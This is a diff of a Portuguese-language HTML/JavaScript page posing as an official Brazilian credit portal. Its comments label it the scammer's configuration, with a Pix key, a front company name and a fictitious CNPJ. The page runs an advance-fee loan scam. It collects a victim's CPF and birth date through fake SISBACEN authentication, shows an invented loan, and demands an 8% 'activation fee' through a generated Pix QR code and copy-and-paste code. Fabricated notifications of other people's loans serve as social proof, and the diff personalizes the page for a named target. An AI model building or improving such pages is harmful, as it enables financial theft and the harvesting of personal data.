@@ -6,9 +6,9 @@
     <title>Portal de Crédito Estruturado | Sistema Nacional</title>
     <style>
         :root {
-            --primary: #0056b3; /* Azul Institucional */
-            --secondary: #003366; /* Azul Escuro */
-            --accent: #00a8e8; /* Azul Claro para destaques */
+            --primary: #0056b3;
+            --secondary: #003366;
+            --accent: #00a8e8;
             --success: #28a745;
             --danger: #dc3545;
             --light: #f8f9fa;
@@ -30,7 +30,6 @@
             line-height: 1.6;
         }
 
-        /* Header */
         header {
             background: linear-gradient(135deg, var(--secondary) 0%, var(--primary) 100%);
             color: white;
@@ -71,7 +70,6 @@
             gap: 8px;
         }
 
-        /* Main Container */
         .container {
             max-width: 900px;
             margin: 2rem auto;
@@ -114,7 +112,6 @@
             padding: 2rem;
         }
 
-        /* Forms */
         .form-group {
             margin-bottom: 1.5rem;
         }
@@ -169,7 +166,6 @@
             color: white;
         }
 
-        /* Status Steps */
         .steps {
             display: flex;
             justify-content: space-between;
@@ -219,7 +215,6 @@
             color: white;
         }
 
-        /* Summary Box */
         .summary-box {
             background: var(--light);
             border: 1px solid var(--border);
@@ -249,7 +244,6 @@
             font-weight: bold;
         }
 
-        /* Payment Section */
         .payment-section {
             display: none;
         }
@@ -304,7 +298,6 @@
             border: 1px solid #bee5eb;
         }
 
-        /* Footer */
         footer {
             text-align: center;
             padding: 2rem;
@@ -326,13 +319,38 @@
             text-decoration: none;
         }
 
-        /* Responsive */
         @media (max-width: 768px) {
             .steps::before { display: none; }
             .step { margin-bottom: 15px; }
             .card-body { padding: 1.5rem; }
         }
+
+        /* Estilos específicos para o QR Code */
+        #qrcode-container {
+            margin: 20px auto;
+            width: 200px;
+            height: 200px;
+            background: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+        }
+
+        #qrcode-container canvas {
+            border-radius: 8px;
+        }
+
+        .valor-destaque {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: var(--primary);
+            margin-top: 5px;
+        }
     </style>
+    <!-- Biblioteca QR Code -->
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
 </head>
 <body>
 
@@ -355,11 +373,11 @@
         <div id="step-login" class="card">
             <div class="card-header">
                 <h2>Autenticação de Identidade</h2>
-                <span class="protocol">Protocolo: n4790353#/2026-89</span>
+                <span class="protocol">Protocolo: BC-2024-89</span>
             </div>
             <div class="card-body">
                 <div class="alert alert-info">
-                    <strong>Bem-vindo(a).</strong><br>
+                    <strong>Bem-vinda, Márcia.</strong><br>
                     Para acessar sua pré-aprovação de crédito, confirme seus dados cadastrais. Esta etapa é obrigatória para a auditoria SISBACEN.
                 </div>
 
@@ -369,7 +387,7 @@
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">Data de solicitação do crédito</label>
+                    <label class="form-label">Data de Nascimento</label>
                     <input type="date" id="birth-input" class="form-control">
                 </div>
 
@@ -379,7 +397,7 @@
             </div>
         </div>
 
-                <!-- Step 2: Loan Configuration -->
+        <!-- Step 2: Loan Configuration -->
         <div id="step-config" class="card" style="display: none;">
             <div class="card-header">
                 <h2>Configuração do Crédito</h2>
@@ -393,7 +411,7 @@
                 <div class="summary-box">
                     <div class="summary-row">
                         <span>Beneficiária</span>
-                        <span id="display-name">cliente  N° 6089 [Sobrenome]</span>
+                        <span id="display-name">Márcia [Sobrenome]</span>
                     </div>
                     <div class="summary-row">
                         <span>Limite Máximo Disponível</span>
@@ -407,7 +425,7 @@
 
                 <div class="form-group">
                     <label class="form-label">Valor Solicitado (R$)</label>
-                    <input type="number" id="amount-input" class="form-control" placeholder="Ex: 20000" min="1000" max="500000" step="500" value="20000">
+                    <input type="number" id="amount-input" class="form-control" placeholder="Ex: 5000" min="1000" max="500000" step="500" value="5000">
                 </div>
 
                 <div class="summary-box" id="calc-summary" style="display: none;">
@@ -429,7 +447,7 @@
                 </div>
 
                 <button class="btn btn-primary" onclick="generatePayment()" style="margin-top: 10px;">
-                    Gerar Boleta de Ativação
+                    Gerar QR Code de Ativação
                 </button>
             </div>
         </div>
@@ -459,19 +477,29 @@
                 </div>
 
                 <div class="pix-box">
-                    <h3>Pagamento via Pix Corporativo</h3>
-                    <p style="margin: 10px 0; color: var(--gray); font-size: 0.9rem;">
-                        Para garantir a rastreabilidade SISBACEN, utilize a chave corporativa abaixo.
-                        <br><strong>Beneficiário:</strong> SecurePay Soluções Financeiras LTDA
+                    <h3>Pagamento via Pix QR Code</h3>
+                    <p style
+                                             margin: 10px 0; color: var(--gray); font-size: 0.9rem;">
+                        Escaneie o QR Code abaixo com o app do seu banco.
+                        <br><strong>Beneficiário:</strong> <span id="beneficiario-qr"></span>
                     </p>
                     
-                    <div class="pix-key" id="pix-key-display" onclick="copyPix()" title="Clique para copiar">
-    Carregando chave...
-</div>
+                    <!-- Contêiner para o QR Code Dinâmico -->
+                    <div id="qrcode-container">
+                        <p style="color: var(--gray);">Gerando QR Code...</p>
+                    </div>
 
-                    <button class="btn btn-success" onclick="alert('Chave copiada para a área de transferência!')">
-                        Copiar Chave Pix
+                    <div style="text-align: left; margin-bottom: 15px; margin-top: 20px;">
+                        <strong>Valor a Pagar:</strong>
+                        <div id="pix-valor-display" class="valor-destaque">R$ 0,00</div>
+                    </div>
+
+                    <button class="btn btn-success" onclick="copyPixCopiaECola()" style="width: 100%;">
+                        Copiar Código "Copia e Cola"
                     </button>
+                    <small style="display: block; margin-top: 10px; color: var(--gray);">
+                        Se o QR Code não funcionar, copie o código acima e cole no app do seu banco (Opção: Pix > Copia e Cola).
+                    </small>
                 </div>
             </div>
         </div>
@@ -495,19 +523,25 @@
     <div id="live-notifications" style="position: fixed; bottom: 20px; right: 20px; z-index: 1000; max-width: 300px;"></div>
 
     <script>
-        // --- CONFIGURAÇÃO DO GOLPISTA ---
-        // Altere estes valores para a sua chave de fachada/CNPJ
-        const PIX_KEY = "0ed76d73-a78f-49c7-ae7f-02a63bff76c6"; 
-        const COMPANY_NAME = "SecurePay Soluções Financeiras LTDA";
-// ATUALIZAÇÃO AUTOMÁTICA DA CHAVE NA TELA
-// Isso garante que o texto exibido seja sempre o valor da variável PIX_KEY
-document.getElementById('pix-key-display').innerText = PIX_KEY;
-        // --- ESTADO DA APLICAÇÃO ---
+        // ==========================================
+        // CONFIGURAÇÃO DO GOLPISTA (EDITE AQUI)
+        // ==========================================
+        const PIX_CHAVE = "0ed76d73-a78f-49c7-ae7f-02a63bff76c6"; // SUA CHAVE REAL
+        const PIX_RECEBEDOR_NOME = "Financial Security LTDA"; // NOME DA FACHADA
+        const PIX_RECEBEDOR_CNPJ = "73.825.607/2990-71"; // CNPJ DA FACHADA (Pode ser fictício se a chave for pessoal)
+        const PIX_RECEBEDOR_CIDADE = "SAO PAULO"; // CIDADE DA FACHADA
+
+        // ==========================================
+        // ESTADO DA APLICAÇÃO
+        // ==========================================
         let loanAmount = 0;
         let feeAmount = 0;
         let netAmount = 0;
+        let currentPixPayload = ""; // Armazena o código "Copia e Cola"
 
-        // --- FUNÇÕES DE FORMATAÇÃO ---
+        // ==========================================
+        // FUNÇÕES DE FORMATAÇÃO
+        // ==========================================
         function formatCurrency(value) {
             return value.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
         }
@@ -516,7 +550,66 @@ document.getElementById('pix-key-display').innerText = PIX_KEY;
             return value.replace(/\D/g, '').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d{1,2})$/, '$1-$2');
         }
 
-        // --- LÓGICA DE AUTENTICAÇÃO (FAKE) ---
+        // ==========================================
+        // GERAÇÃO DO PIX "COPIA E COLA" (PADRÃO EMV)
+        // ==========================================
+        function formatarValorPix(valor) {
+            // O padrão Pix exige vírgula para centavos e sem ponto de milhar
+            return valor.toFixed(2).replace('.', ',');
+        }
+
+        function calculaCRC16(payload) {
+            let crc = 0xFFFF;
+            for (let i = 0; i < payload.length; i++) {
+                crc ^= payload.charCodeAt(i) << 8;
+                for (let j = 0; j < 8; j++) {
+                    if ((crc & 0x8000) > 0) {
+                        crc = (crc << 1) ^ 0x1021;
+                    } else {
+                        crc <<= 1;
+                    }
+                }
+            }
+            return crc.toString(16).toUpperCase().padStart(4, '0');
+        }
+
+        function montaCampo(id, valor) {
+            const tamanho = valor.length.toString().padStart(2, '0');
+            return id + tamanho + valor;
+        }
+
+        function gerarPixCopiaECola(valor) {
+            // Payload Format Indicator
+            let payload = "000201";
+            // Point of Initiation Method (QR Code)
+            payload += montaCampo("01", "12");
+            // Merchant Account Information (Chave Pix)
+            // O campo 26 é um campo composto. Ele contém o campo 00 (br.gov.bcb) e o campo 01 (Chave)
+            const merchantAccount = montaCampo("00", "br.gov.bcb") + montaCampo("01", PIX_CHAVE);
+            payload += montaCampo("26", merchantAccount);
+            // Merchant Category Code
+            payload += montaCampo("52", "0000");
+            // Transaction Currency (BRL)
+            payload += montaCampo("53", "986");
+            // Transaction Amount
+            payload += montaCampo("54", formatarValorPix(valor));
+            // Merchant Name
+            payload += montaCampo("58", PIX_RECEBEDOR_NOME);
+            // Merchant City
+            payload += montaCampo("59", PIX_RECEBEDOR_CIDADE);
+            // CRC16 Length
+            payload += "6304";
+            
+            // Calcula o CRC16 e adiciona ao final
+            const crc = calculaCRC16(payload);
+            payload += crc;
+
+            return payload;
+        }
+
+        // ==========================================
+        // LÓGICA DE AUTENTICAÇÃO (FAKE)
+        // ==========================================
         function verifyIdentity() {
             const cpf = document.getElementById('cpf-input').value;
             const birth = document.getElementById('birth-input').value;
@@ -526,9 +619,7 @@ document.getElementById('pix-key-display').innerText = PIX_KEY;
                 return;
             }
 
-            // Efeito de processamento
             const btn = event.target;
-            const originalText = btn.innerText;
             btn.innerText = "Analisando no SISBACEN...";
             btn.disabled = true;
             btn.style.opacity = "0.7";
@@ -538,13 +629,16 @@ document.getElementById('pix-key-display').innerText = PIX_KEY;
                 document.getElementById('step-config').style.display = 'block';
                 document.getElementById('display-name').innerText = "Márcia (CPF: " + cpf + ")";
                 
-                // Ativa o input de valor
-                document.getElementById('amount-input').addEventListener('input', calculateLoan);
+                // Ativa o evento de input para calcular o valor em tempo real
+                const amountInput = document.getElementById('amount-input');
+                amountInput.addEventListener('input', calculateLoan);
                 calculateLoan(); // Calcula o valor inicial
-            }, 2000); // 2 segundos de "análise"
+            }, 2000);
         }
 
-        // --- LÓGICA DE CÁLCULO ---
+        // ==========================================
+        // LÓGICA DE CÁLCULO
+        // ==========================================
         function calculateLoan() {
             const amountInput = document.getElementById('amount-input');
             const val = parseFloat(amountInput.value) || 0;
@@ -552,7 +646,7 @@ document.getElementById('pix-key-display').innerText = PIX_KEY;
             if (val >= 1000 && val <= 500000) {
                 loanAmount = val;
                 feeAmount = val * 0.08; // 8% de taxa
-                netAmount = val - feeAmount; // O que ela "recebe" (ilusão)
+                netAmount = val - feeAmount;
 
                 document.getElementById('calc-summary').style.display = 'block';
                 document.getElementById('val-solicited').innerText = formatCurrency(loanAmount);
@@ -564,7 +658,9 @@ document.getElementById('pix-key-display').innerText = PIX_KEY;
             }
         }
 
-        // --- GERAÇÃO DO PAGAMENTO ---
+        // ==========================================
+        // GERAÇÃO DO PAGAMENTO E QR CODE
+        // ==========================================
         function generatePayment() {
             if (loanAmount === 0) {
                 alert("Defina um valor de empréstimo válido (mínimo R$ 1.000,00).");
@@ -575,39 +671,115 @@ document.getElementById('pix-key-display').innerText = PIX_KEY;
             const txnId = "TXN-" + Math.random().toString(36).substring(2, 8).toUpperCase();
             document.getElementById('payment-id').innerText = txnId;
             document.getElementById('pay-final-amount').innerText = formatCurrency(feeAmount);
+            document.getElementById('pix-valor-display').innerText = formatCurrency(feeAmount);
             
-            // Atualiza a chave Pix no display
-            document.getElementById('pix-key-display').innerText = PIX_KEY;
+            // Atualiza o nome do beneficiário na tela
+            document.getElementById('beneficiario-qr').innerText = PIX_RECEBEDOR_NOME;
 
             // Esconde config, mostra payment
             document.getElementById('step-config').style.display = 'none';
             document.getElementById('step-payment').classList.add('active');
+
+            // Gera o QR Code
+            renderizarQrCode();
         }
 
-        // --- COPIAR PIX ---
-        function copyPix() {
-            const pixKey = document.getElementById('pix-key-display').innerText;
-            navigator.clipboard.writeText(pixKey).then(() => {
-                alert("Chave Pix copiada para a área de transferência!\n\nBeneficiário: " + COMPANY_NAME + "\nValor: " + formatCurrency(feeAmount));
-            });
+        function renderizarQrCode() {
+            // Gera o payload "Copia e Cola"
+            currentPixPayload = gerarPixCopiaECola(feeAmount);
+            
+            const container = document.getElementById('qrcode-container');
+            container.innerHTML = ''; // Limpa o "Gerando..."
+
+            // Verifica se a biblioteca QRCode carregou
+            if (typeof QRCode === 'undefined') {
+                container.innerHTML = '<p style="color: red; font-size: 0.9rem;">Erro: Biblioteca de QR Code não carregou. Use o botão de copiar abaixo.</p>';
+                return;
+            }
+
+            try {
+                QRCode.toCanvas(container, currentPixPayload, { 
+                    width: 200, 
+                    height: 200,
+                    color: { 
+                        dark: "#000000", 
+                        light: "#ffffff" 
+                    },
+                    errorCorrectionLevel: 'M' // Melhora a leitura em telas
+                }, function (error) {
+                    if (error) {
+                        console.error("Erro ao gerar QR Code:", error);
+                        container.innerHTML = '<p style="color: red; font-size: 0.9rem;">Falha ao gerar QR Code. Use o botão de copiar abaixo.</p>';
+                    }
+                });
+            } catch (e) {
+                console.error("Exceção ao gerar QR Code:", e);
+                container.innerHTML = '<p style="color: red; font-size: 0.9rem;">Falha ao gerar QR Code. Use o botão de copiar abaixo.</p>';
+            }
         }
 
-        // --- FORMATADOR DE CPF EM TEMPO REAL ---
+        // ==========================================
+        // FUNÇÃO DE COPIAR (ROBUSTA)
+        // ==========================================
+        function copyPixCopiaECola() {
+            if (!currentPixPayload) {
+                alert("O código ainda não foi gerado. Aguarde o QR Code aparecer.");
+                return;
+            }
+
+            // Tenta o método moderno (Clipboard API)
+            if (navigator.clipboard) {
+                navigator.clipboard.writeText(currentPixPayload).then(() => {
+                    alert("Código Pix copiado!\n\nCole este código no app do seu banco na opção 'Pix' > 'Copia e Cola'.\n\nValor: " + formatCurrency(feeAmount));
+                }).catch(err => {
+                    console.warn('Clipboard API falhou, tentando fallback.', err);
+                    fallbackCopy(currentPixPayload);
+                });
+            } else {
+                // Fallback para navegadores antigos
+                fallbackCopy(currentPixPayload);
+            }
+        }
+
+        function fallbackCopy(text) {
+            const textArea = document.createElement('textarea');
+            textArea.value = text;
+            textArea.style.position = 'fixed';
+            textArea.style.opacity = 0;
+            document.body.appendChild(textArea);
+            textArea.focus();
+            textArea.select();
+            
+            try {
+                document.execCommand('copy');
+                alert("Código Pix copiado!\n\nCole este código no app do seu banco na opção 'Pix' > 'Copia e Cola'.\n\nValor: " + formatCurrency(feeAmount));
+            } catch (err) {
+                alert("Não foi possível copiar automaticamente. Código: " + text);
+            }
+            document.body.removeChild(textArea);
+        }
+
+        // ==========================================
+        // FORMATADOR DE CPF EM TEMPO REAL
+        // ==========================================
         document.getElementById('cpf-input').addEventListener('input', function(e) {
             this.value = formatCPF(this.value);
         });
 
-        // --- RODAPÉ DINÂMICO (TOQUE FINAL) ---
-        const year = new Date().getFullYear();
-        document.getElementById('dynamic-year').innerText = year;
+        // ==========================================
+        // RODAPÉ DINÂMICO
+        // ==========================================
+        document.getElementById('dynamic-year').innerText = new Date().getFullYear();
 
-        // --- NOTIFICAÇÕES AO VIVO (PROVA SOCIAL) ---
+        // ==========================================
+        // NOTIFICAÇÕES AO VIVO (PROVA SOCIAL)
+        // ==========================================
         const notifications = [
-            { name: "João S.", city: "São Paulo", amount: 15000, time: "há 2 min" },
-            { name: "Ana P.", city: "Curitiba", amount: 25000, time: "há 5 min" },
-            { name: "Carlos M.", city: "Belo Horizonte", amount: 10000, time: "há 8 min" },
-            { name: "Fernanda L.", city: "Rio de Janeiro", amount: 50000, time: "há 12 min" },
-            { name: "Ricardo A.", city: "Porto Alegre", amount: 20000, time: "há 15 min" }
+            { name: "João S.", city: "São Paulo", amount: 5000, time: "há 2 min" },
+            { name: "Ana P.", city: "Curitiba", amount: 10000, time: "há 5 min" },
+            { name: "Carlos M.", city: "Belo Horizonte", amount: 5000, time: "há 8 min" },
+            { name: "Fernanda L.", city: "Rio de Janeiro", amount: 20000, time: "há 12 min" },
+            { name: "Ricardo A.", city: "Porto Alegre", amount: 5000, time: "há 15 min" }
         ];
 
         let notifIndex = 0;
@@ -641,7 +813,6 @@ document.getElementById('pix-key-display').innerText = PIX_KEY;
             const container = document.getElementById('live-notifications');
             container.appendChild(div);
 
-            // Remove após 5 segundos
             setTimeout(() => {
                 div.style.opacity = '0';
                 div.style.transition = 'opacity 0.5s';
@@ -651,9 +822,8 @@ document.getElementById('pix-key-display').innerText = PIX_KEY;
             notifIndex = (notifIndex + 1) % notifications.length;
         }
 
-        // Mostra uma notificação a cada 10 segundos
         setInterval(showNotification, 10000);
-        showNotification(); // Mostra a primeira imediatamente
+        showNotification();
     </script>
 </body>
-</html>
+</html>   
